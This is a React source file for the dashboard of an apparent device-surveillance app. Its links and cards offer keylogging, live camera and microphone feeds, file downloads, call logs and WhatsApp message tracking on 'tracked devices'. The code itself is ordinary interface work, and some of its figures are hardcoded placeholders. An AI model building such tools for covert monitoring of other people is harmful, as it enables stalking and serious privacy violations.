import React, { useEffect, useState } from "react";
import axios, { AxiosError } from "axios";
import {
  Typography,
  Grid,
  Card,
  CardContent,
  Alert,
  Box,
  LinearProgress,
  Skeleton,
  Paper,
  Chip,
  Avatar,
  Button,
  Divider,
  CardHeader,
  IconButton,
  useTheme as useMuiTheme,
} from "@mui/material";
import { Link } from "react-router-dom";
import "remixicon/fonts/remixicon.css";
import { useTheme } from "../context/ThemeContext";
import { formatDateForScreenReader } from "../utils/accessibility";
import AccessibilityAnnouncement from "../components/AccessibilityAnnouncement";

// Interface for dashboard data structure
interface DashboardData {
  total_devices: number;
  last_location: {
    latitude: number;
    longitude: number;
    timestamp?: string;
  } | null;
  recent_logs: { timestamp: string; event: string }[];
}

// Define ThemeExtras interface for additional UI customization
interface ThemeExtras {
  card: string;
  border: string;
  input: string;
  headingSecondary: string;
  cardHeader: string;
  textSecondary: string;
}

// Quick links data for quick access buttons
const quickLinks = [
  { icon: "ri-map-pin-line", name: "Location", path: "/location", color: "#4FC3F7" },
  { icon: "ri-phone-line", name: "Call Logs", path: "/calls", color: "#4CAF50" },
  { icon: "ri-message-3-line", name: "Social Media", path: "/social-media", color: "#FF9800" },
  { icon: "ri-apps-2-line", name: "App Usage", path: "/app-usage", color: "#9C27B0" },
  { icon: "ri-spy-line", name: "Keylogger", path: "/keylogger", color: "#F44336" },
];

// Features data for feature cards
const featuresData = [
  { 
    icon: "ri-camera-line", 
    title: "Live Camera", 
    description: "View real-time camera feed from tracked devices", 
    path: "/live-camera",
    color: "#2196F3"
  },
  { 
    icon: "ri-file-list-line", 
    title: "File Access", 
    description: "Access and download files from tracked devices", 
    path: "/file-access",
    color: "#4CAF50"
  },
  { 
    icon: "ri-bookmark-line", 
    title: "Browsing History", 
    description: "Track web browsing activities and history", 
    path: "/browsing-history",
    color: "#FF9800" 
  },
  { 
    icon: "ri-mic-line", 
    title: "Live Audio", 
    description: "Listen to audio from tracked device microphones", 
    path: "/live-audio",
    color: "#E91E63"
  },
];

// Status updates for recent activity
const activityData = [
  {
    avatar: "D1",
    device: "Samsung Galaxy S23",
    action: "Location updated",
    time: "5 minutes ago",
    color: "#4FC3F7",
    icon: "ri-map-pin-line"
  },
  {
    avatar: "D2",
    device: "iPhone 15 Pro",
    action: "New call recorded",
    time: "10 minutes ago",
    color: "#4CAF50",
    icon: "ri-phone-line"
  },
  {
    avatar: "D1",
    device: "Samsung Galaxy S23",
    action: "New WhatsApp messages",
    time: "15 minutes ago",
    color: "#FF9800",
    icon: "ri-message-3-line"
  },
  {
    avatar: "D1",
    device: "Samsung Galaxy S23",
    action: "New photo captured",
    time: "30 minutes ago",
    color: "#E91E63",
    icon: "ri-camera-line"
  },
];

const Dashboard = () => {
  const [dashboardData, setDashboardData] = useState<DashboardData | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [announcement, setAnnouncement] = useState<string>("");
  
  // Access theme contexts
  const { colors, accessibility } = useTheme();
  const muiTheme = useMuiTheme();
  
  // Define theme extras for additional UI customization
  const themeExtras: ThemeExtras = {
    card: accessibility.highContrast ? muiTheme.palette.background.paper : colors.surface,
    border: accessibility.highContrast ? muiTheme.palette.text.primary : `${colors.primary}20`,
    input: accessibility.highContrast ? muiTheme.palette.text.primary : colors.primary,
    headingSecondary: accessibility.highContrast ? muiTheme.palette.text.primary : colors.secondary,
    cardHeader: accessibility.highContrast ? muiTheme.palette.text.primary : colors.primary,
    textSecondary: accessibility.highContrast ? muiTheme.palette.text.secondary : colors.text
  };
  
  // Combine colors with theme extras for a complete theme object
  const themeColors = { ...colors, ...themeExtras };

  useEffect(() => {
    const fetchDashboardData = async () => {
      const token = localStorage.getItem("token");

      if (!token) {
        console.warn("No authentication token found.");
        setError("Authentication token is missing.");
        setLoading(false);
        return;
      }

      try {
        const response = await axios.get("/api/tracker/user/dashboard/", {
          headers: { Authorization: `Token ${token}` },
          withCredentials: true,
        });

        setDashboardData(response.data);
        setError(null);
      } catch (err: unknown) {
        if (err instanceof AxiosError) {
          console.error("Error fetching dashboard data:", err.response?.data || err.message);
        } else {
          console.error("An unexpected error occurred:", err);
        }
        setError("Failed to load dashboard data.");
      } finally {
        setLoading(false);
      }
    };

    fetchDashboardData();
  }, []);

  // Stat card component for displaying key metrics
  const StatCard = ({ icon, title, value, color, subtitle }: { 
    icon: string; 
    title: string; 
    value: string | number; 
    color: string;
    subtitle?: string;
  }) => (
    <Card sx={{ 
      height: '100%',
      borderRadius: 2,
      boxShadow: '0 2px 10px rgba(0,0,0,0.08)',
      bgcolor: themeColors.card,
      borderColor: themeColors.border,
      transition: 'transform 0.2s',
      '&:hover': {
        transform: 'translateY(-5px)',
        boxShadow: '0 5px 15px rgba(0,0,0,0.1)',
      }
    }}>
      <CardContent sx={{ p: 3 }}>
        <Box sx={{ display: 'flex', alignItems: 'center', mb: 2 }}>
          <Box sx={{ 
            display: 'flex', 
            alignItems: 'center', 
            justifyContent: 'center',
            bgcolor: `${color}20`, 
            color: color,
            borderRadius: 2,
            width: 48,
            height: 48,
            mr: 2
          }}>
            <i className={icon} style={{ fontSize: '1.5rem' }}></i>
          </Box>
          <Box>
            <Typography variant="subtitle2" color={themeColors.textSecondary} sx={{ fontSize: '0.875rem' }}>
              {title}
            </Typography>
            <Typography variant="h5" sx={{ fontWeight: 'bold', mt: 0.5, color: themeColors.text }}>
              {loading ? <Skeleton width={80} /> : value}
            </Typography>
            {subtitle && (
              <Typography variant="caption" color={themeColors.textSecondary}>
                {subtitle}
              </Typography>
            )}
          </Box>
        </Box>
      </CardContent>
    </Card>
  );

  // Feature card component for displaying main features
  const FeatureCard = ({ icon, title, description, path, color }: { 
    icon: string; 
    title: string; 
    description: string; 
    path: string;
    color: string;
  }) => (
    <Card component={Link} to={path} sx={{ 
      height: '100%',
      borderRadius: 2,
      boxShadow: '0 2px 10px rgba(0,0,0,0.08)',
      bgcolor: themeColors.card,
      borderColor: themeColors.border,
      transition: 'transform 0.2s',
      textDecoration: 'none',
      color: 'inherit',
      '&:hover': {
        transform: 'translateY(-5px)',
        boxShadow: '0 5px 15px rgba(0,0,0,0.1)',
      }
    }}>
      <CardContent sx={{ p: 3 }}>
        <Box sx={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          bgcolor: `${color}20`, 
          color: color,
          borderRadius: 2,
          width: 48,
          height: 48,
          mb: 2
        }}>
          <i className={icon} style={{ fontSize: '1.5rem' }}></i>
        </Box>
        <Typography variant="h6" sx={{ fontWeight: 'bold', mb: 1, color: themeColors.text }}>
          {title}
        </Typography>
        <Typography variant="body2" color={themeColors.textSecondary}>
          {description}
        </Typography>
      </CardContent>
    </Card>
  );

  return (
    <Box>
      {/* Page Header */}
      <Box sx={{ mb: 4 }}>
        <Typography variant="h4" sx={{ 
          fontWeight: '700', 
          mb: 1,
          background: 'linear-gradient(90deg, #3a8eba 0%, #5e35b1 100%)',
          WebkitBackgroundClip: 'text',
          WebkitTextFillColor: 'transparent',
        }}>
          Dashboard Overview
        </Typography>
        <Typography variant="body1" color={themeColors.textSecondary}>
          Welcome back! Here's what's happening with your tracked devices.
        </Typography>
      </Box>

      {/* Error Alert */}
      {error && (
        <Alert severity="error" sx={{ mb: 3, borderRadius: 2 }}>
          {error}
        </Alert>
      )}

      {/* Loading Indicator */}
      {loading && <LinearProgress sx={{ mb: 3, borderRadius: 1 }} />}

      {/* Quick Access Buttons */}
      <Grid container spacing={2} sx={{ mb: 4 }}>
        {quickLinks.map((link, index) => (
          <Grid item key={index} xs={4} sm={2.4} md={2.4}>
            <Paper 
              component={Link} 
              to={link.path}
              elevation={0}
              sx={{ 
                display: 'flex', 
                flexDirection: 'column', 
                alignItems: 'center',
                justifyContent: 'center',
                p: 2,
                borderRadius: 2,
                textDecoration: 'none',
                color: 'inherit',
                height: '100%',
                bgcolor: themeColors.card,
                border: `1px solid ${themeColors.border}`,
                transition: 'all 0.2s',
                '&:hover': {
                  transform: 'translateY(-3px)',
                  boxShadow: '0 5px 15px rgba(0,0,0,0.05)',
                  border: `1px solid ${link.color}30`,
                }
              }}
            >
              <Box sx={{ 
                display: 'flex', 
                alignItems: 'center', 
                justifyContent: 'center',
                bgcolor: `${link.color}15`, 
                color: link.color,
                borderRadius: '50%',
                width: { xs: 40, sm: 48 },
                height: { xs: 40, sm: 48 },
                mb: 1.5
              }}>
                <i className={link.icon} style={{ fontSize: '1.25rem' }}></i>
              </Box>
              <Typography 
                variant="body2" 
                sx={{ 
                  fontWeight: '500',
                  fontSize: { xs: '0.75rem', sm: '0.875rem' },
                  textAlign: 'center',
                  color: themeColors.text
                }}
              >
                {link.name}
              </Typography>
            </Paper>
          </Grid>
        ))}
      </Grid>

      {/* Stats Cards */}
      <Typography variant="h5" sx={{ fontWeight: 'bold', mb: 2, color: themeColors.headingSecondary }}>
        Monitoring Status
      </Typography>
      <Grid container spacing={3} sx={{ mb: 4 }}>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard 
            icon="ri-smartphone-line" 
            title="Tracked Devices" 
            value={dashboardData?.total_devices || 0}
            color="#4FC3F7"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard 
            icon="ri-map-pin-line" 
            title="Location Updates" 
            value="38"
            color="#4CAF50"
            subtitle="Today"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard 
            icon="ri-phone-line" 
            title="Call Logs" 
            value="17"
            color="#FF9800"
            subtitle="Last 24 hours"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatCard 
            icon="ri-message-3-line" 
            title="Messages Tracked" 
            value="64"
            color="#E91E63"
            subtitle="Last 24 hours"
          />
        </Grid>
      </Grid>

      {/* Location Info Card */}
      <Typography variant="h5" sx={{ fontWeight: 'bold', mb: 2, color: themeColors.headingSecondary }}>
        Key Insights
      </Typography>
      <Grid container spacing={3} sx={{ mb: 4 }}>
        {/* Last Known Location */}
        <Grid item xs={12} md={6}>
          <Card sx={{ 
            height: '100%',
            borderRadius: 2,
            boxShadow: '0 2px 10px rgba(0,0,0,0.08)',
            bgcolor: themeColors.card,
            borderColor: themeColors.border
          }}>
            <CardHeader
              sx={{ bgcolor: themeColors.cardHeader }}
              title={
                <Box sx={{ display: 'flex', alignItems: 'center' }}>
                  <i className="ri-map-pin-line" style={{ color: '#4FC3F7', marginRight: '8px' }}></i>
                  <Typography variant="h6" sx={{ fontWeight: 'bold', color: themeColors.headingSecondary }}>Last Known Location</Typography>
                </Box>
              }
              action={
                <Button 
                  component={Link} 
                  to="/location" 
                  size="small" 
                  endIcon={<i className="ri-arrow-right-line"></i>}
                >
                  View Map
                </Button>
              }
            />
            <Divider sx={{ borderColor: themeColors.border }} />
            <CardContent>
              {loading ? (
                <>
                  <Skeleton variant="text" height={30} sx={{ mb: 1 }} />
                  <Skeleton variant="text" height={30} sx={{ mb: 1 }} />
                  <Skeleton variant="text" height={30} />
                </>
              ) : dashboardData?.last_location?.latitude && dashboardData?.last_location?.longitude ? (
                <>
                  <Box sx={{ display: 'flex', alignItems: 'center', mb: 2 }}>
                    <Chip
                      label="Active"
                      size="small"
                      sx={{
                        bgcolor: '#4CAF50',
                        color: 'white',
                        fontWeight: 'bold',
                        mr: 1
                      }}
                    />
                    <Typography variant="body2" color={themeColors.textSecondary}>
                      Last updated: {
                        dashboardData.last_location.timestamp
                          ? new Date(dashboardData.last_location.timestamp).toLocaleString()
                          : "Unknown"
                      }
                    </Typography>
                  </Box>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="body2" color={themeColors.textSecondary} gutterBottom>
                      Latitude
                    </Typography>
                    <Typography variant="h6" sx={{ fontWeight: 'medium', color: themeColors.text }}>
                      {dashboardData.last_location.latitude}
                    </Typography>
                  </Box>
                  <Box>
                    <Typography variant="body2" color={themeColors.textSecondary} gutterBottom>
                      Longitude
                    </Typography>
                    <Typography variant="h6" sx={{ fontWeight: 'medium', color: themeColors.text }}>
                      {dashboardData.last_location.longitude}
                    </Typography>
                  </Box>
                </>
              ) : (
                <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', py: 3 }}>
                  <Box sx={{ 
                    display: 'flex', 
                    alignItems: 'center', 
                    justifyContent: 'center',
                    bgcolor: themeColors.border, 
                    borderRadius: '50%',
                    width: 60,
                    height: 60,
                    mb: 2
                  }}>
                    <i className="ri-map-pin-line" style={{ fontSize: '1.5rem', color: themeColors.textSecondary }}></i>
                  </Box>
                  <Typography variant="body1" align="center" sx={{ mb: 1, color: themeColors.text }}>
                    No location data available
                  </Typography>
                  <Typography variant="body2" color={themeColors.textSecondary} align="center">
                    Location data will appear here once devices start reporting their position.
                  </Typography>
                </Box>
              )}
            </CardContent>
          </Card>
        </Grid>

        {/* Recent Activity */}
        <Grid item xs={12} md={6}>
          <Card sx={{ 
            height: '100%',
            borderRadius: 2,
            boxShadow: '0 2px 10px rgba(0,0,0,0.08)',
            bgcolor: themeColors.card,
            borderColor: themeColors.border
          }}>
            <CardHeader
              sx={{ bgcolor: themeColors.cardHeader }}
              title={
                <Box sx={{ display: 'flex', alignItems: 'center' }}>
                  <i className="ri-history-line" style={{ color: '#9C27B0', marginRight: '8px' }}></i>
                  <Typography variant="h6" sx={{ fontWeight: 'bold', color: themeColors.headingSecondary }}>Recent Activities</Typography>
                </Box>
              }
              action={
                <Button 
                  component={Link} 
                  to="/user-activity-logs" 
                  size="small" 
                  endIcon={<i className="ri-arrow-right-line"></i>}
                >
                  View All
                </Button>
              }
            />
            <Divider sx={{ borderColor: themeColors.border }} />
            <CardContent sx={{ p: 0 }}>
              {loading ? (
                <Box sx={{ p: 2 }}>
                  <Skeleton variant="rectangular" height={60} sx={{ borderRadius: 1, mb: 1 }} />
                  <Skeleton variant="rectangular" height={60} sx={{ borderRadius: 1, mb: 1 }} />
                  <Skeleton variant="rectangular" height={60} sx={{ borderRadius: 1 }} />
                </Box>
              ) : dashboardData && dashboardData.recent_logs && dashboardData.recent_logs.length > 0 ? (
                dashboardData.recent_logs.map((log, index) => {
                  const logLength = dashboardData.recent_logs ? dashboardData.recent_logs.length : 0;
                  return (
                    <React.Fragment key={index}>
                      <Box sx={{ 
                        display: 'flex', 
                        p: 2, 
                        alignItems: 'flex-start', 
                        '&:hover': { bgcolor: `${themeColors.border}40` } 
                      }}>
                        <Avatar 
                          sx={{ 
                            bgcolor: index % 2 === 0 ? '#4FC3F7' : '#FF9800',
                            width: 40,
                            height: 40,
                            mr: 2
                          }}
                        >
                          {index % 2 === 0 ? 'D1' : 'D2'}
                        </Avatar>
                        <Box sx={{ flexGrow: 1 }}>
                          <Typography variant="body2" sx={{ fontWeight: 'medium', color: themeColors.text }}>
                            {log.event}
                          </Typography>
                          <Typography variant="caption" color={themeColors.textSecondary}>
                            {new Date(log.timestamp).toLocaleString()}
                          </Typography>
                        </Box>
                      </Box>
                      {index < logLength - 1 && <Divider sx={{ borderColor: themeColors.border }} />}
                    </React.Fragment>
                  );
                })
              ) : (
                <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', py: 4 }}>
                  <Box sx={{ 
                    display: 'flex', 
                    alignItems: 'center', 
                    justifyContent: 'center',
                    bgcolor: themeColors.border, 
                    borderRadius: '50%',
                    width: 60,
                    height: 60,
                    mb: 2
                  }}>
                    <i className="ri-history-line" style={{ fontSize: '1.5rem', color: themeColors.textSecondary }}></i>
                  </Box>
                  <Typography variant="body1" align="center" sx={{ mb: 1, color: themeColors.text }}>
                    No recent activities
                  </Typography>
                  <Typography variant="body2" color={themeColors.textSecondary} align="center">
                    Activity logs will appear here as your tracked devices report events.
                  </Typography>
                </Box>
              )}
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      {/* Feature Cards */}
      <Typography variant="h5" sx={{ fontWeight: 'bold', mb: 2, color: themeColors.headingSecondary }}>
        Key Monitoring Features
      </Typography>
      <Grid container spacing={3} sx={{ mb: 4 }}>
        {featuresData.map((feature, index) => (
          <Grid item xs={12} sm={6} md={3} key={index}>
            <FeatureCard {...feature} />
          </Grid>
        ))}
      </Grid>
    </Box>
  );
};

export default Dashboard;
